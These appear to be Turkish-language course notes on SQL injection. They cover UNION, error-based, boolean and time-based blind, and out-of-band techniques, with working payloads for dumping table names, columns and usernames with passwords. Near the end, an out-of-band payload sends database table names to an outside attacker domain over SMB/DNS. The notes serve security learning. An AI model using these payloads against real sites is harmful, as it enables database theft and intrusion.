<h1 align="center">SQL Injection</h1>

# SQL Injection Nedir?
* Saldırganın, web yazılımını kullanarak veritabanı sorgusu çalıştırmabilmesidir.

### SQL Injection Nasıl Tespit Edilir?

* SQL INJECTION TIME BASED PAYLOADLAR ILE TESPIT EDILIR !!!! 
* Her db için ayrı sleep metodları vardır. 
* Data insert ederken bile sleep methodunu çalıştırabilirsin. 
* SQL Injection bulurken kendine bir referans noktası seçersin ve denediğin yöntemlerle bu ilk noktaya dönmeye çalışırsın. Başarırsan zaafiyeti kanıtlamışsın demektir.
* SQLi tespit etmek için URL kısmında şunları dene: 
```python
..../productid=4'
	herhangi bir hata falan verirse
..../productid=4''
	böylesini dene, eğer referans noktana dönüyorsan SQLi var demektir.
..../productid=5-1
	bunu da deneyebilirsin
```

## Notlar

- SQL injectionda gönderdiğin data, arka tarafta SQL sorgusu olarak gidiyor. Data, data olarak kalırsa sorun çözülmüş olur.

- ORM uygulama denir buna. Prepare statement deniyor buna. İnputları parametrelendirmek yani.
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/223883df-681b-4e37-9026-2c1e34fe39b3)

```SQL
database() --> mevcut database ismini döndürür

SELECT 2+1;
3

SELECT '2-1';
2-1

SELECT '2'-'1';     --> integer casting yapıyor
1                 

SELECT '2'+'a';    --> 2yi integer cast edebiliyor ama 'a'yı cast edemiyor.
2                 

SELECT 'b'+'a';
0

SELECT '2' '1'; veya SELECT concat('2','1');  --> boşluğu string concatenation yapıyor.
21        

SELECT SELECT '2' '1' 'a';
21a

SELECT SELECT '2' '1' 'a' - 1;   -->  önce çıkartmayı yapıp sonra string birleştirme yapıyor.
20a                 

SELECT 2^1;    -->     XOR operantı bu  2^2 = 0
3

SELECT ~1;    -->      max integer input
18446744073709551614

DROP DATABASE;
```

- Database tablolarına veri eklerken trim(boşlukları silme) işlemi yapmazken, veriyi çekerken trim yapıyor.

- SQL Injection kod örnekleri:
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/7325c682-bc1c-40be-821f-fbf499c0b7cf)
![image](https://github.com/grealyve/MDISec-Web-Security-and-Hacking-Notes/assets/41903311/8ef456c1-9521-4dd8-ad54-9849f2212e4b)

## UNION SQLi

.../id=2-1
- Peşpeşe SELECT sorgusu çalıştırmak için UNION kullan ama UNION kullanabilmen için 2. SELECT’deki kolon sayısı aynı olması gerekiyor. 
- UNION SELECT 1,2,3,4,5,6,7,8,9,10,11… böyle gidersin.
- Eğer ekranda 7 2 9 gibi değerler görüyorsan bu kodda 2. indisteki kodu uygulama, ekrana yaz demektir bu. Arama çubuğuna gidip 7 yerine version() fonksiyonunu çalıştırdığında veri çekebilir hale gelebilirsin.
- İlk SELECT sorgusunun cevabını görmemek için -99999999 yazabilirsin id UNION’dan önce.
- Sonra versiyon yerine database() yazarsan database ismini getirir.

```SQL
' UNION SELECT 1,2,3,4,5,6,table_name,8,9,10,11 FROM information_schema.tables WHERE table_schema = database()  
	  bu şekilde tablo isimlerini çektik

' UNION SELECT 1,2,3,4,5,6,column_name,8,9,10,11 FROM information_schema.column WHERE table_name = ‘users’  
	  users’ın kolonlarını çekme

' UNION SELECT 1,2,3,4,5,6,uname,8,9,10,11 FROM users  
	  uname yerine kolon isimlerinde ne çıkarsa artık
```
* bu kısımda fonksiyon kullanmak da verimli olabilir || 6,concat(uname,’:MDISEC:’,pass),8,9,..  || veya regex yazıp çözebilirsin.

## Error Based SQLi

- SQL sorgusunun database’de oluşturduğu syntax’ın geri dönmesi sonucu, o syntax hatası içine çıkartmak istediğni veriyi yerleştirmeyle oluşuyor.
- Eğer ki verdirttiğin hata tee database’e kadar gidiyorsa sen bu yardımcı metodu kullanarak data getirebilirsin. XML şeklinde veriyorsun
- Syntax hatası olmadan bu tür olmaz.
```SQL
rand() —> 0-1 arası random sayı üretir.

SELECT extractvalue(rand(), concat(1,"Ali"));
		burada sonuç olarak hata dönüyor ama içinde "Ali" de geçiyor. Sorgunun içindeki string değeri hatanının içinde döndürtmeyi başardın demek.
		böylece subquery kullanabilirsin demek oluyor.
SELECT extractvalue(rand(), concat(1,(SELECT 'mehmet')));  eğer yine hatada mehmet dönerse istediğin sorguyu atabilirsin.
SELECT extractvalue(rand(), concat(1,(SELECT database())));
```

## AND/OR SQLi
```SQL
	www.x.com/?id=1' and '2'=1
yaptığında sayfanın davranışına göre kod analizi yapabilirsin.
	www.x.com/?id=1' and 1=1 #  bu da iş yapar
WAF kafana geçiriyorsa
	www.x.com/?id=2^1 
koy site değişiyorsa SQLi vardır demektir.
```

## WHERE id IN (1)
```SQL
www.x.com/?id=1) UNION SELECT #
```

## Tırnaklama
```SQL
SELECT * FROM users WHERE id = '1'''; 
	olduğunda tırnak, tırnağı escape edeceği için sana yine cevabı çevirmiş olur. 3 tane tırnak olsa hata verir.
```

## Boolean-Based / Blind SQLi
- Örnek python kodu:
```python
if result().size > 0:
	print("haber var")
else:
	print("haber yok")
```
> Bu şekilde injection yapılabiliyor:
```SQL
SELECT * FROM haberler WHERE id = 1 and 1=1
SELECT * FROM haberler WHERE id = 1 and (SELECT 1)=1
SELECT * FROM haberler WHERE id = 1 and (SELECT 1)=2  2 
	yaparak referans noktanın değiştiğini gözlemle.
SELECT * FROM haberler WHERE id = 1 and SUBSTRING('MEHMET',1,1)='M'  
	Substring fonksiyonu string ifadeyi indexten indexe kesecek işlemi yapar.
SELECT * FROM haberler WHERE id = 1 and SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 1, 1)='a'
	ilk tablo ismini stringi bölerek 'a' eşitlemeye çalışır. 'u' yu bulana kadar alfabetik değiştir. 2 tane for döngüsüyle bütün harfleri bulursun.
Bu işlemi hızlandırmak için:
SELECT * FROM haberler WHERE id = 1 and ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1), 1, 1))> 80
SELECT * FROM haberler WHERE id = 1 and ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1,1), 1, 1))> 80
```
## Time Based SQLi
> Bu şekilde injection yapılabiliyor:
```SQL
SELECT * FROM haberler WHERE id = 1 and 1=IF (1=1,1,0)  condition doğruysa 1 dön değilse 0 dön.
SELECT * FROM haberler WHERE id = 1 and 1=IF (1=1,sleep(5),0)      eğer cevap dönmesi uzun sürerse açığı yakaladın demektir.
	Sonrasında SUBSTRING ve ASCII'den yürü.
```
## Out-of-Band SQLi
- Örnek python kodu:
```python
id = request.get('id')

rabbitmq.pushTask('report_generate',id)
	Senden gelen integer değerleri SQL sorgusu içine yolluyor yani içeride başka işler dönüyor. sleep falan yaramaz aga.
print("selam")
```
> Bu şekilde injection yapılabiliyor:
```SQL
SELECT 'ali' INTO OUTFILE '/tmp/test.txt'; komutu diske bir şeyler yazmana yarar. Bunu kullanarak bir şeyler elde edebilirsin.
SELECT 'ali' INTO OUTFILE '\\\hacker.mdisec.com/a'; windows un özelliğidir bu samba protoklü ile verilen domainin 445.portuna gitmeye çalışır.
	Bunun subdomainine subSELECT kurarsan rahatça table_name falan elde edersin.
SELECT * INTO OUTFILE '\\\'+(SELECT table_name FROM information_schema.tables WHERE table_schema=database())+.mdisec.com/a'
	DB'in bağlı olduğu DNS serveri üstünden senin name serverına istek atar ve dataları orada görürsün.
```
